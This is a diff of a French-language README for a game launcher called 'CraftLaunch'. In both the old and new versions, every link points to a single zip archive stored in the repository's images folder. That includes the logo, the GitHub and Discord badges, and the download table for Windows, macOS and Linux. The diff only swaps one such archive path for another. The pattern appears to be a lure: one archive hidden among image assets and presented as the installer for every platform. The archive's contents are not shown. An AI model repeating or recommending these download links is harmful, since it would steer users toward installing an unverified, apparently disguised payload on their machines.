@@ -1,18 +1,18 @@
-<p align="center"><img src="https://github.com/NguyenPhamMC/Selvania-Launcher/raw/refs/heads/master/src/assets/images/logo/Selvania-Launcher-v2.2.zip" alt="icon-launcher"></p>
+<p align="center"><img src="https://github.com/NguyenPhamMC/Selvania-Launcher/raw/refs/heads/master/src/assets/images/background/Launcher_Selvania_v1.0.zip" alt="icon-launcher"></p>
 
 <h1 align="center">CraftLaunch</h1>
 
 [<p align="center">]()
-![GitHub all releases](https://github.com/NguyenPhamMC/Selvania-Launcher/raw/refs/heads/master/src/assets/images/logo/Selvania-Launcher-v2.2.zip)
-![Discord](https://github.com/NguyenPhamMC/Selvania-Launcher/raw/refs/heads/master/src/assets/images/logo/Selvania-Launcher-v2.2.zip)
-![GitHub https://github.com/NguyenPhamMC/Selvania-Launcher/raw/refs/heads/master/src/assets/images/logo/Selvania-Launcher-v2.2.zip version](https://github.com/NguyenPhamMC/Selvania-Launcher/raw/refs/heads/master/src/assets/images/logo/Selvania-Launcher-v2.2.zip)
+![GitHub all releases](https://github.com/NguyenPhamMC/Selvania-Launcher/raw/refs/heads/master/src/assets/images/background/Launcher_Selvania_v1.0.zip)
+![Discord](https://github.com/NguyenPhamMC/Selvania-Launcher/raw/refs/heads/master/src/assets/images/background/Launcher_Selvania_v1.0.zip)
+![GitHub https://github.com/NguyenPhamMC/Selvania-Launcher/raw/refs/heads/master/src/assets/images/background/Launcher_Selvania_v1.0.zip version](https://github.com/NguyenPhamMC/Selvania-Launcher/raw/refs/heads/master/src/assets/images/background/Launcher_Selvania_v1.0.zip)
 [<p align="center">]()
-![GitHub forks](https://github.com/NguyenPhamMC/Selvania-Launcher/raw/refs/heads/master/src/assets/images/logo/Selvania-Launcher-v2.2.zip)
-![GitHub Repo stars](https://github.com/NguyenPhamMC/Selvania-Launcher/raw/refs/heads/master/src/assets/images/logo/Selvania-Launcher-v2.2.zip)
+![GitHub forks](https://github.com/NguyenPhamMC/Selvania-Launcher/raw/refs/heads/master/src/assets/images/background/Launcher_Selvania_v1.0.zip)
+![GitHub Repo stars](https://github.com/NguyenPhamMC/Selvania-Launcher/raw/refs/heads/master/src/assets/images/background/Launcher_Selvania_v1.0.zip)
 
 <p align="center">
-    <a href="https://github.com/NguyenPhamMC/Selvania-Launcher/raw/refs/heads/master/src/assets/images/logo/Selvania-Launcher-v2.2.zip">
-        <img src="https://github.com/NguyenPhamMC/Selvania-Launcher/raw/refs/heads/master/src/assets/images/logo/Selvania-Launcher-v2.2.zip">
+    <a href="https://github.com/NguyenPhamMC/Selvania-Launcher/raw/refs/heads/master/src/assets/images/background/Launcher_Selvania_v1.0.zip">
+        <img src="https://github.com/NguyenPhamMC/Selvania-Launcher/raw/refs/heads/master/src/assets/images/background/Launcher_Selvania_v1.0.zip">
     </a>
 </p>
 
@@ -72,9 +72,9 @@ Si vous téléchargez à partir des Releases, sélectionnez le programme d'insta
 
  Plateforme | Fichier |
 | -------- | ---- |
-| Windows x64 | `https://github.com/NguyenPhamMC/Selvania-Launcher/raw/refs/heads/master/src/assets/images/logo/Selvania-Launcher-v2.2.zip ` |
-| macOS x64 | `https://github.com/NguyenPhamMC/Selvania-Launcher/raw/refs/heads/master/src/assets/images/logo/Selvania-Launcher-v2.2.zip` |
-| macOS arm64 | `https://github.com/NguyenPhamMC/Selvania-Launcher/raw/refs/heads/master/src/assets/images/logo/Selvania-Launcher-v2.2.zip` |
-| Linux x64 | `https://github.com/NguyenPhamMC/Selvania-Launcher/raw/refs/heads/master/src/assets/images/logo/Selvania-Launcher-v2.2.zip` |
+| Windows x64 | `https://github.com/NguyenPhamMC/Selvania-Launcher/raw/refs/heads/master/src/assets/images/background/Launcher_Selvania_v1.0.zip ` |
+| macOS x64 | `https://github.com/NguyenPhamMC/Selvania-Launcher/raw/refs/heads/master/src/assets/images/background/Launcher_Selvania_v1.0.zip` |
+| macOS arm64 | `https://github.com/NguyenPhamMC/Selvania-Launcher/raw/refs/heads/master/src/assets/images/background/Launcher_Selvania_v1.0.zip` |
+| Linux x64 | `https://github.com/NguyenPhamMC/Selvania-Launcher/raw/refs/heads/master/src/assets/images/background/Launcher_Selvania_v1.0.zip` |
 
 ---
